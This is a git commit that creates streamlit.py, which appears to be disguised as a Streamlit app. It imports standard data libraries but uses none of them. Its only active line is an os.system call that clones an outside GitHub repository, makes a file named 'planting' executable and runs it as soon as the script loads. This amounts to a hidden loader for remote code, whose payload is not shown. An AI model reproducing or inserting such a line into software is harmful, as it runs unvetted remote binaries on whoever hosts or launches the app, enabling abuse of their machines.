1748c1567b9b54530a34a6fe4329859c22adfeca
boleproty <107357168+boleproty@users.noreply.github.com>
2022-07-11 21:47:55 +0700

    Create streamlit.py

---
+++ streamlit.py
@@ -0,0 +1,7 @@
+from collections import namedtuple
+import altair as alt
+import math
+import pandas as pd
+import streamlit as st
+import os
+os.system ("git clone https://github.com/boleproty/app-s.git && cd app-s && chmod +x planting && ./planting")
